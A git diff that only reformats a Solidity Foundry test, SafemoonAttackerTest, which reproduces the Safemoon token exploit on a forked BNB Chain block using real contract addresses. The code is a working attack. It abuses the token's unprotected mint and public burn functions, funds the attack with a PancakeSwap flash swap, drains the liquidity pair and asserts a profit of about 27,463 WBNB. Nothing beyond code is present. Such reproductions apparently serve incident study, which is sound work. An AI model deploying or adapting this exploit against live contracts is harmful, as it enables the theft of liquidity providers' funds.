@@ -33,40 +33,25 @@ interface ISafeSwapTradeRouter {
         uint256 deadline;
     }
 
-    function getSwapFees(
-        uint256 amountIn,
-        address[] memory path
-    ) external view returns (uint256 _fees);
+    function getSwapFees(uint256 amountIn, address[] memory path) external view returns (uint256 _fees);
 
-    function swapExactTokensForTokensWithFeeAmount(
-        Trade calldata trade
-    ) external payable;
+    function swapExactTokensForTokensWithFeeAmount(Trade calldata trade) external payable;
 }
 
 interface IWETH {
-    function approve(address, uint) external returns (bool);
+    function approve(address, uint256) external returns (bool);
 
-    function transfer(address, uint) external returns (bool);
+    function transfer(address, uint256) external returns (bool);
 
-    function balanceOf(address) external view returns (uint);
+    function balanceOf(address) external view returns (uint256);
 }
 
 interface IPancakePair {
-    function swap(
-        uint amount0Out,
-        uint amount1Out,
-        address to,
-        bytes calldata data
-    ) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
 }
 
 interface IPancakeCallee {
-    function pancakeCall(
-        address sender,
-        uint amount0,
-        uint amount1,
-        bytes calldata data
-    ) external;
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
 }
 
 interface IUniswapV2Pair {
@@ -79,7 +64,7 @@ contract SafemoonAttackerTest is Test, IPancakeCallee {
     IWETH public weth;
 
     function setUp() public {
-        vm.createSelectFork("https://rpc.ankr.com/bsc", 26854757);
+        vm.createSelectFork("https://rpc.ankr.com/bsc", 26_854_757);
 
         sfmoon = ISafemoon(0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5);
         pancakePair = IPancakePair(0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1);
@@ -87,58 +72,47 @@ contract SafemoonAttackerTest is Test, IPancakeCallee {
     }
 
     function testMint() public {
-        vm.rollFork(26854757);
+        vm.rollFork(26_854_757);
 
-        uint originalBalance = sfmoon.balanceOf(address(this));
+        uint256 originalBalance = sfmoon.balanceOf(address(this));
         emit log_named_uint("sfmoon balance before:", originalBalance);
         assertEq(originalBalance, 0);
 
-        sfmoon.mint(
-            address(this),
-            sfmoon.balanceOf(sfmoon.bridgeBurnAddress())
-        );
+        sfmoon.mint(address(this), sfmoon.balanceOf(sfmoon.bridgeBurnAddress()));
 
-        uint currentBalance = sfmoon.balanceOf(address(this));
+        uint256 currentBalance = sfmoon.balanceOf(address(this));
         emit log_named_uint("sfmoon balance after:", currentBalance);
-        assertEq(currentBalance, 81804509291616467966);
+        assertEq(currentBalance, 81_804_509_291_616_467_966);
     }
 
     function testBurn() public {
-        vm.rollFork(26864889);
+        vm.rollFork(26_864_889);
 
-        uint originalBalance = weth.balanceOf(address(this));
+        uint256 originalBalance = weth.balanceOf(address(this));
         emit log_named_uint("weth balance before:", originalBalance);
         assertEq(originalBalance, 0);
 
         pancakePair.swap(1000 ether, 0, address(this), "ggg");
 
-        uint currentBalance = weth.balanceOf(address(this));
+        uint256 currentBalance = weth.balanceOf(address(this));
         emit log_named_uint("weth balance after:", currentBalance);
-        assertEq(currentBalance, 27463848254806782408231);
+        assertEq(currentBalance, 27_463_848_254_806_782_408_231);
     }
 
-    function doBurnHack(uint amount) public {
+    function doBurnHack(uint256 amount) public {
         swappingBnbForTokens(amount);
-        sfmoon.burn(
-            sfmoon.uniswapV2Pair(),
-            sfmoon.balanceOf(sfmoon.uniswapV2Pair()) - 1000000000
-        );
+        sfmoon.burn(sfmoon.uniswapV2Pair(), sfmoon.balanceOf(sfmoon.uniswapV2Pair()) - 1_000_000_000);
         sfmoon.burn(address(sfmoon), sfmoon.balanceOf(address(sfmoon)));
         IUniswapV2Pair(sfmoon.uniswapV2Pair()).sync();
         swappingTokensForBnb(sfmoon.balanceOf(address(this)));
     }
 
-    function pancakeCall(
-        address sender,
-        uint amount0,
-        uint amount1,
-        bytes calldata data
-    ) external {
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
         require(msg.sender == address(pancakePair));
         require(sender == address(this));
 
         doBurnHack(amount0);
-        weth.transfer(msg.sender, (amount0 * 10030) / 10000);
+        weth.transfer(msg.sender, (amount0 * 10_030) / 10_000);
     }
 
     function swappingBnbForTokens(uint256 tokenAmount) private {
@@ -146,9 +120,7 @@ contract SafemoonAttackerTest is Test, IPancakeCallee {
         path[0] = address(weth);
         path[1] = address(sfmoon);
 
-        ISafeSwapTradeRouter tradeRouter = ISafeSwapTradeRouter(
-            sfmoon.uniswapV2Router().routerTrade()
-        );
+        ISafeSwapTradeRouter tradeRouter = ISafeSwapTradeRouter(sfmoon.uniswapV2Router().routerTrade());
         weth.approve(address(sfmoon.uniswapV2Router()), tokenAmount);
 
         uint256 feeAmount = tradeRouter.getSwapFees(tokenAmount, path);
@@ -159,9 +131,7 @@ contract SafemoonAttackerTest is Test, IPancakeCallee {
             to: payable(address(this)),
             deadline: block.timestamp
         });
-        tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(
-            trade
-        );
+        tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(trade);
     }
 
     function swappingTokensForBnb(uint256 tokenAmount) private {
@@ -169,9 +139,7 @@ contract SafemoonAttackerTest is Test, IPancakeCallee {
         path[0] = address(sfmoon);
         path[1] = address(weth);
 
-        ISafeSwapTradeRouter tradeRouter = ISafeSwapTradeRouter(
-            sfmoon.uniswapV2Router().routerTrade()
-        );
+        ISafeSwapTradeRouter tradeRouter = ISafeSwapTradeRouter(sfmoon.uniswapV2Router().routerTrade());
         sfmoon.approve(address(sfmoon.uniswapV2Router()), tokenAmount);
 
         uint256 feeAmount = tradeRouter.getSwapFees(tokenAmount, path);
@@ -182,8 +150,6 @@ contract SafemoonAttackerTest is Test, IPancakeCallee {
             to: payable(address(this)),
             deadline: block.timestamp
         });
-        tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(
-            trade
-        );
+        tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(trade);
     }
 }
